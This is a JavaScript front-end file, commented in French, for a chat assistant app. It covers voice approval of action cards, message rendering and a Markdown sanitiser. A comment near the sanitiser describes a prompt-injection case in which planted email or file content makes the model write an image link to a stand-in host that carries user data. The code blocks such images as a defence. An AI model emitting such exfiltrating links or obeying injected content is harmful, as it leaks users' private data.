// la carte sait d'elle-même, et l'exécution — qui passe par les MÊMES
// fonctions que le clic (resolveDriveAction, runMailDraftAct) : ni second
// chemin d'exécution, ni second jeu de contrôles. Le serveur re-vérifie tout
// au moment T, comme pour un clic.
//
// La voix agit sur la carte en attente la PLUS RÉCENTE de la conversation
// affichée (« approuve tout » / « annule tout » : toutes les cartes
// d'approbation — jamais un email, qui se relit un par un).

/** Cartes encore en attente dans la conversation affichée, dans l'ordre du fil. */
function pendingActionCards() {
    return Array.from(document.querySelectorAll('#chatMessages .drive-confirm-card')).filter(card =>
        !card.classList.contains('is-done') && !card.classList.contains('is-cancelled')
        && !card.classList.contains('is-failed') && !card.classList.contains('is-busy')
        && !!card.querySelector('.drive-confirm-actions .drive-confirm-btn:not(:disabled)'));
}

/** Ce que la reconnaissance a besoin de savoir d'une carte (cf. MiaVoiceCommands.cardCommand). */
function voiceCardContext(card) {
    if (card.classList.contains('mail-draft-card')) {
        const m = (card.__preview && card.__preview.mail) || {};
        const fields = mailDraftFields(card);
        return {
            kind: 'mail',
            mode: String(card.dataset.mode || 'preview'),
            recipients: fields.destinataire + ' ' + fields.cc,
            presets: (m.presets || []).map(pr => String(pr.key)),
            canUndo: (card.__history || []).length > 0,
        };
    }
    return { kind: 'approval', title: String(card.querySelector('.drive-confirm-title')?.textContent || '') };
}

/** Annonce d'une issue d'exécution (clés de ChatController::VOICE_CUES). */
function voiceCueForOutcome(outcome, done) {
    if (outcome === 'executed') return done;
    if (outcome === 'started') return 'vc_started';
    if (outcome === 'cancelled') return 'vc_cancelled';
    return 'vc_failed';
}

/**
 * Exécute l'ordre vocal `cmd` sur la carte. `say(cue)` annonce une étape
 * pendant l'attente (« Je réécris le message »). Rend les annonces à dire à
 * la fin, dans l'ordre.
 */
async function runVoiceCardCommand(card, cmd, say) {
    try { card.scrollIntoView({ block: 'nearest', behavior: 'smooth' }); } catch (_) {}

    if (!card.classList.contains('mail-draft-card')) {
        if (cmd.act === 'reask') return ['vc_say_approve'];
        const decision = cmd.act === 'approve' ? 'approve' : 'cancel';
        const cards = cmd.all
            ? pendingActionCards().filter(c => !c.classList.contains('mail-draft-card'))
            : [card];
        let cue = 'vc_failed';
        let failed = false;
        for (const target of cards) {
            const outcome = await resolveDriveAction(target, decision);
            const one = voiceCueForOutcome(outcome, 'vc_done');
            if (one === 'vc_failed') failed = true;
            else cue = one;
        }
        const cues = [failed ? 'vc_failed' : cue];
        // Une autre carte attend encore : la dire, sinon elle passe inaperçue.
        if (!failed && pendingActionCards().length > 0) cues.push('vc_more');
        return cues;
    }

    switch (cmd.act) {
        case 'send': {
            const outcome = await runMailDraftAct(card, 'send', null);
            if (outcome === 'confirm') return ['vc_send_confirm'];
            return [outcome === 'unavailable' ? 'vc_send_unavailable' : 'vc_failed'];
        }
        case 'confirm':
            return [voiceCueForOutcome(await runMailDraftAct(card, 'send-confirm', null), 'vc_sent')];
        case 'reask':
            return ['vc_send_confirm'];
        case 'back':
            await runMailDraftAct(card, 'send-cancel', null);
            return ['vc_not_sent'];
        case 'draft':
            return [voiceCueForOutcome(await runMailDraftAct(card, 'approve', null), 'vc_draft')];
        case 'discard':
            return [voiceCueForOutcome(await runMailDraftAct(card, 'cancel', null), 'vc_cancelled')];
        case 'improve':
            // Panneau déjà ouvert : le clic le refermerait — à la voix, « améliore »
            // redemande simplement quoi changer.
            if (card.dataset.mode !== 'improve') await runMailDraftAct(card, 'improve', null);
            return ['vc_improve_ask'];
        case 'close':
            await runMailDraftAct(card, 'panel-close', null);
            return ['vc_ok'];
        case 'preset':
        case 'instruct': {
            say('vc_improving');
            const outcome = cmd.act === 'preset'
                ? await runMailDraftAct(card, 'preset', null, { preset: cmd.preset })
                : await runMailDraftAct(card, 'instruct', null, { instruction: cmd.instruction });
            return [outcome === 'revised' ? 'vc_improved' : 'vc_failed'];
        }
        case 'undo':
            return [(await runMailDraftAct(card, 'undo', null)) === 'revised' ? 'vc_restored' : 'vc_failed'];
        default:
            return [];
    }
}

/**
 * Re-affiche les cartes d'approbation encore en attente : au chargement
 * (window.DRIVE_PENDING_ACTIONS) et au changement de conversation (liste
 * rendue par /chat/{id}/json — sans elle, une carte disparaissait jusqu'au
 * rechargement de la page).
 */
function renderPendingDriveActions(list) {
    const pending = Array.isArray(list) ? list : (window.DRIVE_PENDING_ACTIONS || []);
    const wrap = document.getElementById('chatMessages');
    if (!pending.length || !wrap) return;
    pending.forEach(p => {
        // Sous la réponse qui l'a proposée quand elle est à l'écran (comme en
        // direct), sinon en fin de fil (action d'avant le rattachement,
        // réponse supprimée par une régénération).
        const owner = p.message_id
            ? wrap.querySelector(`.message[data-message-id="${Number(p.message_id)}"] .msg-body`)
            : null;
        if (owner) {
            renderDriveConfirmCard(owner, Object.assign({ id: p.id }, p.preview || {}));
            return;
        }
        const msg = document.createElement('div');
        msg.className = 'message message-assistant drive-confirm-standalone';
        const body = document.createElement('div');
        body.className = 'msg-body';
        msg.appendChild(body);
        wrap.appendChild(msg);
        renderDriveConfirmCard(body, Object.assign({ id: p.id }, p.preview || {}));
    });
    syncDriveBatchBar();
}

function appendMessage(role, text, files = [], streaming = false, options = {}) {
    const wrap = document.getElementById('chatMessages');

    // Retire l'écran de bienvenue si présent (et le layout accueil centré)
    const welcome = wrap.querySelector('.chat-welcome');
    if (welcome) welcome.remove();
    document.querySelector('.chat-main')?.classList.remove('is-home');
    // La suggestion de suite visait la réponse d'avant : un nouveau message
    // l'efface (syncComposerSuggestion la recalcule aux fins de réponse).
    window.MiaComposerHints?.setSuggestion?.(null);

    // Affiche la toolbar
    document.getElementById('chatToolbar')?.style.setProperty('display', '');

    const div = document.createElement('div');
    div.className = `message message-${role}`;

    const avatar = document.createElement('div');
    if (role === 'assistant') {
        avatar.className = 'msg-avatar assistant-avatar';
        const profileSel = document.getElementById('profileSelect');
        const selOpt = profileSel?.options[profileSel.selectedIndex];
        // basename : aligné sur l'identité du composer (assistantIdentityAvatar) et le rendu PHP
        const avatarFile = String(selOpt?.dataset?.avatar || window.ACTIVE_PROFILE_AVATAR || '').split('/').pop();
        const avatarSrc = avatarFile
            ? '/assets/img/profils/' + avatarFile
            : (window.LOGO_URL || '/assets/img/logo.png');
        avatar.innerHTML = `<img src="${avatarSrc}" alt="assistant" style="width:50px;height:50px;border-radius:50%;object-fit:cover">`;
    } else {
        if (window.USER_AVATAR_URL) {
            avatar.className = 'msg-avatar user-avatar';
            avatar.innerHTML = `<img src="${window.USER_AVATAR_URL}" alt="" style="width:32px;height:32px;border-radius:50%;object-fit:cover">`;
        } else {
            avatar.className = 'msg-avatar user-avatar-fallback';
            avatar.textContent = '?';
        }
    }

    const body = document.createElement('div');
    body.className = 'msg-body';

    const messageId = options?.messageId || null;
    if (messageId) div.dataset.messageId = String(messageId);
    let hasRichAttachment = false;

    // Affichage des fichiers joints
    files.forEach(f => {
        if (f.previewUrl) {
            const w = document.createElement('div');
            w.className = 'msg-image-wrap';
            w.innerHTML = `<img src="${escHtml(f.previewUrl)}" alt="${escHtml(f.name)}" class="msg-image"><div class="msg-image-name">${escHtml(f.name)}</div>`;
            body.appendChild(w);
        } else if (role === 'assistant' && f.type === 'html_page') {
            hasRichAttachment = true;
            body.insertAdjacentHTML('beforeend', buildHtmlCard(messageId, Math.max(0, String(text || '').length)));
        } else if (role === 'assistant' && f.type === 'map_route') {
            hasRichAttachment = true;
            let mapSpec = null;
            try { mapSpec = JSON.parse(String(text || '')); } catch (_) {}
            body.insertAdjacentHTML('beforeend', buildMapCard(messageId, mapSpec));
        } else if (role === 'assistant' && f.type === 'slide_deck') {
            hasRichAttachment = true;
            let deckSpec = null;
            try { deckSpec = JSON.parse(String(text || '')); } catch (_) {}
            body.insertAdjacentHTML('beforeend', buildDeckCard(messageId, deckSpec));
        } else if (role === 'assistant' && f.type === 'video_file') {
            hasRichAttachment = true;
            const videoUrl = f.path || '';
            const videoFilename = f.name || (videoUrl ? videoUrl.split('/').pop() : 'video.mp4');
            body.insertAdjacentHTML('beforeend', buildVideoCard(messageId, videoUrl, t('Vidéo MP4'), videoFilename));
        } else {
            const fileEl = document.createElement('div');
            fileEl.className = 'msg-file';
            fileEl.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/></svg> ${escHtml(f.name)}`;
            body.appendChild(fileEl);
        }
    });

    const content = document.createElement('div');
    content.className = `msg-content${streaming ? ' streaming' : ''}`;
    content.dataset.raw = text;
    if (messageId) content.dataset.messageId = String(messageId);

    if (role === 'assistant') {
        if (streaming) {
            content.appendChild(buildStreamPhaseEl('analyzing'));
        }

        const md = document.createElement('span');
        md.className = 'md-render';
        if (text && !streaming && !hasRichAttachment) {
            if (looksLikeErrorMessage(text)) {
                // Erreur API persistée → bloc d'erreur élégant (cohérent avec le live).
                md.innerHTML = buildErrorBlockHtml(errorPayloadFromText(text));
                content.dataset.errorBlock = '1';
            } else {
                md.innerHTML = renderMarkdown(text);
                hydrateGeneratedFiles(md);
                initCodeCopyBtns(content);
            }
        }
        content.appendChild(md);

        // Boutons d'action — adaptés au contenu (image vs texte) dès le rendu.
        // Sinon un message image chargé depuis l'historique (navigation SPA)
        // affiche les boutons texte (Export PDF/Word) jusqu'au rechargement
        // complet de la page (rendu serveur).
        const actions = document.createElement('div');
        actions.className = 'msg-actions';
        const actionsRaw = streaming ? '' : (text || '');
        actions.innerHTML = buildAssistantActionsHtml(actionsRaw);
        actions.dataset.imageOnly = isImageOnlyText(actionsRaw) ? '1' : '0';
        if (!hasRichAttachment || streaming) {
            body.appendChild(content);
        }
        // Une création (deck, page web, carte, vidéo) porte ses propres actions
        // sur sa carte. Copier/Regénérer/Exporter travailleraient ici sur la
        // spec JSON du message : sans objet, et trompeur.
        if (!hasRichAttachment || streaming) {
            body.appendChild(actions);
        }
        // Trace des actions effectuées avant la réponse (historique JSON) —
        // renderActionTrace la pose en tête de bulle, comme au live.
        if (Array.isArray(options?.actions) && options.actions.length) {
            renderActionTrace(body, options.actions);
        }
        if (options?.plan && Array.isArray(options.plan.etapes)) {
            renderPlanCard(body, options.plan);
        }
        if (options?.suite) div.dataset.suite = String(options.suite);
        // Suggestion de suite déjà calculée ('' = aucune suite) : relue par
        // syncComposerSuggestion() sans nouvel appel. Même attribut que message.php.
        if (typeof options?.suggestion === 'string') div.dataset.suggestion = options.suggestion;
    } else {
        content.textContent = text;
        body.appendChild(content);
        // Bouton « Copier » sous le message utilisateur — révélé au clic sur
        // le texte (classe show-actions sur .message, cf. délégation plus bas).
        if (text) {
            const userActions = document.createElement('div');
            userActions.className = 'msg-actions msg-actions-user';
            userActions.innerHTML = buildUserActionsHtml();
            body.appendChild(userActions);
        }
    }

    div.appendChild(avatar);
    div.appendChild(body);
    wrap.appendChild(div);

    // Badge LLM (provider + modèle [+ crédits]) sous bulle assistant si fourni
    if (role === 'assistant' && options?.llmBadge) {
        applyLlmBadge(div, options.llmBadge, options.creditsUsed || 0, options.responseMs || 0);
    }

    scrollBottom(true);
    updateTopToolbarMeta({ historyCount: wrap.querySelectorAll('.message').length });
    // Un message de plus : les choix d'une réponse précédente ne sont plus à prendre.
    syncChoicePrompts();

    return content;
}

let followBottom = true;
const FOLLOW_BOTTOM_THRESHOLD = 80;
const resumeFollowBtn = document.getElementById('resumeFollowBtn');

function isNearBottom() {
    if (!chatMsgs) return true;
    return chatMsgs.scrollHeight - chatMsgs.scrollTop - chatMsgs.clientHeight <= FOLLOW_BOTTOM_THRESHOLD;
}

function isStreamingActive() {
    const cid = String(visibleConvId || convId() || '');
    const stream = cid ? activeStreams.get(cid) : null;
    if (stream && !stream.done) return true;
    return !!chatMsgs?.querySelector('.msg-content.streaming');
}

function updateResumeFollowBtn() {
    if (!resumeFollowBtn) return;
    const show = isStreamingActive() && !followBottom;
    resumeFollowBtn.hidden = !show;
}

if (chatMsgs) {
    chatMsgs.addEventListener('scroll', () => {
        followBottom = isNearBottom();
        updateResumeFollowBtn();
    }, { passive: true });
}

if (resumeFollowBtn) {
    resumeFollowBtn.addEventListener('click', () => {
        scrollBottom(true);
        updateResumeFollowBtn();
    });
}

function scrollBottom(force = false) {
    if (!chatMsgs) return;
    if (force) followBottom = true;
    if (followBottom) {
        chatMsgs.scrollTop = chatMsgs.scrollHeight;
    }
    updateResumeFollowBtn();
}

function scheduleStreamingMarkdownRender(contentEl) {
    if (!contentEl || contentEl.__streamRenderScheduled || contentEl.__streamRenderFinalized) return;
    contentEl.__streamRenderScheduled = true;

    requestAnimationFrame(() => {
        contentEl.__streamRenderScheduled = false;
        if (contentEl.__streamRenderFinalized) return;
        const raw = contentEl.dataset.raw || '';
        const mdEl = contentEl.querySelector('.md-render');
        if (!mdEl) return;
        mdEl.innerHTML = renderMarkdown(raw, { withCodeActions: false });
        scrollBottom();
    });
}

// ---- Markdown ----
/**
 * Ressources d'un AUTRE site dans une réponse : bloquées jusqu'au clic.
 *
 * Une image se charge seule à l'affichage — sans un clic, l'adresse part vers
 * le site qui l'héberge. C'est le canal d'exfiltration idéal pour un contenu
 * piégé (email, fichier, page lus par un connecteur) qui ferait écrire au
 * modèle « ![](https://tiers.exemple/?d=<données de l'utilisateur>) ». Les
 * images de MIA (même origine, data:) passent ; les autres deviennent un
 * bouton « Afficher » qui nomme le site. Une image affichée est retenue pour
 * la page : le rendu suivant (flux en cours, changement de fil) la garde.
 *
 * Pas de Content-Security-Policy `img-src` sur la page, volontairement : les
 * tuiles des cartes (Leaflet), les favicons des sources citées et les images
 * qu'un utilisateur choisit d'afficher sont des ressources tierces légitimes ;
 * une politique stricte les casserait, une politique large ne protégerait rien.
 */
/**
 * Fuseau IANA du navigateur (« Europe/Paris »), envoyé avec chaque message :
 * le serveur tourne en UTC, l'heure de l'utilisateur situe « ce soir » ou
 * « demain matin ». Chaîne vide si le navigateur ne le dit pas.
 */
function clientTimeZone() {
    try {
        return Intl.DateTimeFormat().resolvedOptions().timeZone || '';
    } catch (_) {
        return '';
    }
}

const allowedExternalImages = new Set();

function isSameOriginResource(url) {
    const value = String(url || '').trim();
    if (value === '' || /^data:image\//i.test(value)) return true;
    // « //hote/x.png » est une adresse EXTERNE (relative au protocole).
    if (value.startsWith('/') && !value.startsWith('//')) return true;
    try {
        return new URL(value, window.location.href).origin === window.location.origin;
    } catch (e) {
        return false;
    }
}

function externalImagePlaceholder(src, alt) {
    let site = src;
    try { site = new URL(src, window.location.href).hostname || src; } catch (e) { /* adresse illisible */ }
    const holder = document.createElement('span');
    holder.className = 'ext-img';
    holder.dataset.src = src;
    if (alt) holder.dataset.alt = alt;
    const btn = document.createElement('button');
    btn.type = 'button';
    btn.className = 'ext-img-load';
    btn.title = t('Image hébergée par un autre site : l’afficher lui signale votre visite. Affichez-la seulement si vous faites confiance à sa source.');
    btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/></svg>';
    const label = document.createElement('span');
    label.className = 'ext-img-label';
    label.textContent = t('Image externe · {site}', { site });
    const action = document.createElement('span');
    action.className = 'ext-img-action';
    action.textContent = t('Afficher');
    btn.append(label, action);
    holder.appendChild(btn);
    return holder;
}

// Afficher une image externe : décision de l'utilisateur, retenue pour la page.
document.addEventListener('click', (e) => {
    const btn = e.target.closest ? e.target.closest('.ext-img-load') : null;
    if (!btn) return;
    const holder = btn.closest('.ext-img');
    const src = holder ? (holder.dataset.src || '') : '';
    if (!src) return;
    e.preventDefault();
    allowedExternalImages.add(src);
    const img = document.createElement('img');
    img.src = src;
    img.alt = holder.dataset.alt || '';
    img.referrerPolicy = 'no-referrer';
    img.loading = 'lazy';
    holder.replaceWith(img);
});

function sanitizeRenderedMarkdownHtml(html) {
    if (!html) return '';

    const template = document.createElement('template');
    template.innerHTML = String(html);

    template.content.querySelectorAll(
        'script,style,iframe,frame,frameset,object,embed,link,meta[http-equiv],base'
    ).forEach((el) => el.remove());

    template.content.querySelectorAll('*').forEach((el) => {
        const tag = el.tagName.toLowerCase();

        Array.from(el.attributes).forEach((attr) => {
            const name = attr.name.toLowerCase();
            const value = String(attr.value || '').trim();

            if (name.startsWith('on') || name === 'style' || name === 'srcdoc') {
                el.removeAttribute(attr.name);
                return;
            }

            if (name === 'href' || name === 'src' || name === 'xlink:href' || name === 'formaction' || name === 'action') {
                if (/^\s*javascript:/i.test(value) || /^\s*data:text\/html/i.test(value)) {
                    el.removeAttribute(attr.name);
                    return;
                }
            }

            // Tout ce qui se charge SEUL depuis un autre site (hors image,
            // traitée plus bas avec son bouton) : vidéo, son, affiche, fond,
            // image SVG. Un lien, lui, attend un clic.
            const autoLoads = name === 'poster' || name === 'background'
                || (name === 'src' && tag !== 'img')
                || ((name === 'href' || name === 'xlink:href') && (tag === 'image' || tag === 'use' || tag === 'feimage'));
            if (autoLoads && !isSameOriginResource(value)) {
                el.removeAttribute(attr.name);
            }
        });

        if (tag === 'a') {
            const href = String(el.getAttribute('href') || '').trim();
            if (href !== '' && !/^(https?:|mailto:|tel:|\/|#)/i.test(href)) {
                el.removeAttribute('href');
            }
            const target = String(el.getAttribute('target') || '').toLowerCase();
            if (target === '_blank') {
                const rel = new Set(
                    String(el.getAttribute('rel') || '')
                        .split(/\s+/)
                        .map((v) => v.trim().toLowerCase())
                        .filter(Boolean)
                );
                rel.add('noopener');
                rel.add('noreferrer');
                el.setAttribute('rel', Array.from(rel).join(' '));
            }
        }

        if (tag === 'img') {
            const src = String(el.getAttribute('src') || '').trim();
            if (src !== '' && !/^(https?:|data:image\/|\/)/i.test(src)) {
                el.removeAttribute('src');
            }
            el.removeAttribute('srcset');
            el.removeAttribute('sizes');
            if (src !== '' && el.hasAttribute('src') && !isSameOriginResource(src)) {
                if (allowedExternalImages.has(src)) {
                    el.setAttribute('referrerpolicy', 'no-referrer');
                } else {
                    el.replaceWith(externalImagePlaceholder(src, String(el.getAttribute('alt') || '')));
                }
            }
        }
    });

    return template.innerHTML;
}

/**
 * Certains modèles encadrent du texte RÉDIGÉ dans un bloc ```markdown/```md —
 * parfois la réponse entière, parfois un passage au milieu (« Proposition de
 * texte : ```md … ``` Si vous voulez… ») : marked le rend alors en bloc de
 * code et l'utilisateur lit la source (tronquée, scroll horizontal) au lieu
 * de la mise en forme. On retire ces fences — et seulement eux.
 *
 * Conditions strictes, pour ne pas casser un bloc de code légitime :
 *  - le langage est explicitement markdown/md (un ``` sans langue reste du
 *    code : c'est le plus souvent une sortie console ou du texte brut voulu
 *    tel quel ; ```text est justement l'échappatoire que la consigne serveur
 *    — capabilityGuardrails — laisse au modèle pour montrer de la syntaxe
 *    Markdown BRUTE) ;
 *  - parcours LIGNE À LIGNE avec état : un « ```md » apparaissant À
 *    L'INTÉRIEUR d'un bloc de code d'une autre langue n'est jamais pris pour
 *    une ouverture (une regex globale s'y ferait piéger), et une ligne
 *    « ```lang » dans un bloc ouvert n'est pas une fermeture (CommonMark :
 *    la fermeture ne porte pas de langue).
 * Le fence de fermeture est optionnel : pendant le streaming il n'est pas
 * encore arrivé, et on veut déjà un rendu correct au fil de l'eau.
 */
function unwrapMarkdownFences(text) {
    if (typeof text !== 'string' || !/```[ \t]*(?:markdown|md)/i.test(text)) return text;
    const lines = text.split('\n');
    const out = [];
    let inMd = false;    // dans un fence md/markdown : contenu recopié, fences retirés
    let inOther = false; // dans un bloc de code d'une autre langue : tout recopié tel quel
    let openLen = 3;     // longueur du fence qui a ouvert le bloc « autre » en cours
    for (const line of lines) {
        // Ligne de fence : au moins trois accents graves, un langage éventuel,
        // puis d'éventuels attributs (```csv fichier="x.xlsx"). Sans ces
        // derniers dans le motif, la ligne d'ouverture d'un FICHIER n'était pas
        // reconnue comme un fence, et sa fermeture passait pour une ouverture :
        // tout le suivi des blocs se décalait d'un cran.
        const fence = line.match(/^[ \t]{0,3}(`{3,})[ \t]*([^\s`]*)([^`]*?)[ \t]*\r?$/);
        if (!fence) { out.push(line); continue; }
        const len = fence[1].length;
        const lang = fence[2].toLowerCase();
        const bare = lang === '' && fence[3].trim() === '';
        if (inMd) { inMd = false; continue; }           // fermeture du fence md → retirée
        if (inOther) {
            // Vraie fermeture : sans langue, et au moins aussi longue que
            // l'ouverture (un fichier ouvert par ```` contient des ``` internes).
            if (bare && len >= openLen) inOther = false;
            out.push(line);                             // « ```md » interne = contenu, recopié
            continue;
        }
        // Un fichier DÉCLARÉ en Markdown (```markdown fichier="courrier.docx")
        // n'est pas du texte à déballer : c'est une carte à télécharger.
        const declared = !!(window.MiaFiles && window.MiaFiles.parseInfo((fence[2] + ' ' + fence[3]).trim()).name);
        if ((lang === 'md' || lang === 'markdown') && !declared) { inMd = true; continue; } // ouverture md → retirée
        inOther = true;                                 // ouverture d'un bloc d'une autre langue
        openLen = len;
        out.push(line);
    }
    return out.join('\n');
}

// Retire les marqueurs de citation ChatGPT (OpenAI Responses API + recherche
// web) : séquences délimitées par les caractères de zone privée U+E200…U+E201
// (contenu « cite␟turn0search0 »). Non interprétés, ils s'affichent en clair
// « citeturn0search0 ». Opère sur le texte complet → gère un marqueur coupé
// entre deux deltas de streaming, et nettoie les messages déjà stockés au
// rechargement. Miroir serveur : ChatController::stripCitationMarkers().
function stripChatgptCitationMarkers(text) {
    if (typeof text !== 'string' || !/[\uE200-\uE206]/.test(text)) return text;
    // Marqueur complet U+E200 … U+E201, puis nettoyage des contrôles
    // résiduels (marqueur tronqué). Plage étroite (E200–E206) pour ne pas
    // toucher d'autres glyphes de zone privée éventuels.
    return text.replace(/\uE200[\s\S]*?\uE201/g, '').replace(/[\uE200-\uE206]/g, '');
}

function renderMarkdown(text, options = {}) {
    if (typeof marked === 'undefined') return escHtml(text);
    marked.setOptions({ breaks: true, gfm: true });
    // Document livré en fichier et contenant lui-même un bloc de code : ses
    // délimiteurs sont rééquilibrés AVANT toute lecture (generated-files.js),
    // sinon le bloc intérieur refermerait le fichier à sa place.
    if (window.MiaFiles) text = window.MiaFiles.balanceFences(text);
    const raw = marked.parse(unwrapMarkdownFences(stripChatgptCitationMarkers(text)));
    let html = sanitizeRenderedMarkdownHtml(raw);
    if (options.withCodeActions === false) {
        return formatNumericCitationLinks(html);
    }
    // Ajoute l'en-tête de bloc de code : « Télécharger » (quand le langage a un
    // format de fichier — generated-files.js) et « Copier ».
    html = html.replace(/<pre><code(?: class="language-(\w+)")?>/g, (_, lang) => {
        const label = lang || 'code';
        const download = window.MiaFiles ? window.MiaFiles.codeDownloadHtml(lang || '') : '';
        return `<pre><div class="code-block-header"><span>${escHtml(label)}</span><span class="code-block-actions">${download}`
             + `<button class="btn-copy-code"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>${t('Copier')}</button></span></div><code${lang ? ` class="language-${lang}"` : ''}>`;
    });
    return formatNumericCitationLinks(html);
}

function formatNumericCitationLinks(html) {
    if (!html) return html;
    const container = document.createElement('div');
    container.innerHTML = html;

    container.querySelectorAll('a').forEach(a => {
        if (a.closest('pre, code')) return;
        const label = (a.textContent || '').trim();
        const match = label.match(/^\[?([1-9]\d?)\]?$/);
        if (!match) return;

        const idx = match[1];
        a.classList.add('citation-link');
        a.dataset.citationIndex = idx;
        a.textContent = '';

        const sup = document.createElement('sup');
        sup.textContent = idx;
        a.appendChild(sup);

        if (!a.getAttribute('aria-label')) {
            a.setAttribute('aria-label', t('Source {n}', { n: idx }));
        }
    });

    return container.innerHTML;
}

/**
 * Termine les fichiers et images d'une réponse COMPLÈTE : aperçu et compteurs
 * des cartes de fichier, bouton de téléchargement sur les images
 * (generated-files.js). À appeler après chaque rendu FINAL — jamais pendant
 * l'écriture, où le rendu est refait à chaque fragment. `.md-render` est passé
 * tel quel : c'est lui que le rendu vient de remplir.
 */
function hydrateGeneratedFiles(mdEl) {
    if (mdEl && window.MiaFiles) window.MiaFiles.hydrate(mdEl);
}

function initCodeCopyBtns(container) {
    container.querySelectorAll('.btn-copy-code').forEach(btn => {
        btn.addEventListener('click', () => {
            const code = btn.closest('pre').querySelector('code').textContent;
            navigator.clipboard.writeText(code).then(() => {
                btn.textContent = t('✓ Copié');
                btn.classList.add('copied');
                setTimeout(() => { btn.innerHTML = '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Copier'; btn.classList.remove('copied'); }, 2000);
            });
        });
    });
}

// ---- Mermaid (schémas) ----
let __mermaidReady = false;
let __mermaidSeq = 0;

// ---- Charte graphique des schémas Mermaid ----
// Les couleurs sont dérivées de la charte MIA : couleur primaire (--accent,
// choisie par l'admin dans les paramètres) + thème global dark/light
// (data-theme sur <html> : celui de l'utilisateur, Réglages → Affichage,
// sinon celui de l'instance). Thème et accent se règlent sur une autre page :
// le changement passe par un rechargement, aucune ré-initialisation à chaud.
// Seul le thème « Automatique » peut basculer en pleine page (l'appareil passe
// en mode sombre) : les schémas déjà rendus gardent alors leurs couleurs
// jusqu'au rendu suivant.
function mermaidHexMix(hexA, hexB, ratioA) {
    // Équivalent JS de color-mix(in srgb, A <ratio>%, B) — Mermaid exige des
    // couleurs résolues, pas de fonctions CSS.
    const toRgb = h => [1, 3, 5].map(i => parseInt(h.slice(i, i + 2), 16));
    const a = toRgb(hexA), b = toRgb(hexB);
    const mixed = a.map((v, i) => Math.round(v * ratioA + b[i] * (1 - ratioA)));
    return '#' + mixed.map(v => v.toString(16).padStart(2, '0')).join('');
}

function mermaidReadableTextOn(hex) {
    // Texte lisible sur un fond donné (luminance relative simplifiée).
    const [r, g, b] = [1, 3, 5].map(i => parseInt(hex.slice(i, i + 2), 16));
    return (0.299 * r + 0.587 * g + 0.114 * b) > 150 ? '#1a1a1a' : '#ffffff';
}

function mermaidThemeVariables() {
    const styles = getComputedStyle(document.documentElement);
    const cssVar = (name, fallback) => {
        const v = styles.getPropertyValue(name).trim();
        return /^#[0-9a-fA-F]{6}$/.test(v) ? v.toLowerCase() : fallback;
    };
    const isLight = document.documentElement.dataset.theme === 'light';
    const accent  = cssVar('--accent', '#10a37f');
    const surface = cssVar('--bg-surface', isLight ? '#ffffff' : '#2f2f2f');
    const text    = cssVar('--text', isLight ? '#1a1a1a' : '#ececec');
    const muted   = cssVar('--text-muted', isLight ? '#6b7280' : '#8e8ea0');
    const border  = cssVar('--border', isLight ? '#d1d5db' : '#3d3d3d');

    // Nœuds : teinte de l'accent sur la surface (plus marquée en light où le
    // blanc délave, plus douce en dark où l'accent sature vite).
    const primary   = mermaidHexMix(accent, surface, isLight ? 0.16 : 0.28);
    const secondary = mermaidHexMix(accent, surface, isLight ? 0.08 : 0.14);
    const tertiary  = mermaidHexMix(border, surface, 0.35);

    return {
        darkMode: !isLight,
        background: surface,
        fontFamily: 'inherit',
        // Nœuds principaux / secondaires / tertiaires
        primaryColor: primary,
        primaryTextColor: mermaidReadableTextOn(primary),
        primaryBorderColor: accent,
        secondaryColor: secondary,
        secondaryBorderColor: mermaidHexMix(accent, border, 0.5),
        tertiaryColor: tertiary,
        tertiaryBorderColor: border,
        // Traits, flèches, libellés
        lineColor: muted,
        textColor: text,
        edgeLabelBackground: surface,
        // Regroupements (subgraph / cluster)
        clusterBkg: mermaidHexMix(accent, surface, isLight ? 0.05 : 0.08),
        clusterBorder: border,
        titleColor: text,
        // Notes (sequence) : teinte douce de l'accent plutôt que le jaune Mermaid
        noteBkgColor: secondary,
        noteTextColor: text,
        noteBorderColor: mermaidHexMix(accent, border, 0.5),
        // Diagramme de séquence
        actorBkg: primary,
        actorTextColor: mermaidReadableTextOn(primary),
        actorBorder: accent,
        activationBkgColor: secondary,
        activationBorderColor: accent,
        sequenceNumberColor: mermaidReadableTextOn(accent),
        // Camembert : déclinaisons de l'accent (du plein vers le pâle)
        pie1: accent,
        pie2: mermaidHexMix(accent, surface, 0.75),
        pie3: mermaidHexMix(accent, surface, 0.55),
        pie4: mermaidHexMix(accent, surface, 0.40),
        pie5: mermaidHexMix(accent, surface, 0.28),
        pie6: mermaidHexMix(accent, surface, 0.18),
        pieTitleTextColor: text,
        pieSectionTextColor: text,
        pieLegendTextColor: text,
        pieStrokeColor: surface,
        pieOuterStrokeColor: border,
    };
}

function ensureMermaidReady() {
    if (typeof mermaid === 'undefined') return false;
    if (!__mermaidReady) {
        try {
            mermaid.initialize({
                startOnLoad: false,
                theme: 'base',
                themeVariables: mermaidThemeVariables(),
                securityLevel: 'strict',
                fontFamily: 'inherit',
                flowchart: { htmlLabels: false, useMaxWidth: true }
            });
        } catch (_) { return false; }
        __mermaidReady = true;
    }
    return true;
}

function mermaidToolbarHtml() {
    return '<div class="mermaid-actions">'
        + '<button type="button" class="btn-mermaid-dl btn-mermaid-png" title="Télécharger en PNG">PNG</button>'
        + '<button type="button" class="btn-mermaid-dl btn-mermaid-svg" title="Télécharger en SVG">SVG</button>'
        + '</div>';
}

// Transforme les blocs ```mermaid en diagrammes rendus. Appelé après le rendu FINAL
// uniquement (jamais en streaming : la source incomplète casserait le parseur Mermaid).
async function renderMermaidBlocks(container) {
    if (!container || !ensureMermaidReady()) return;
    const codes = container.querySelectorAll('code.language-mermaid');
    for (const code of codes) {
        const host = code.closest('pre') || code;
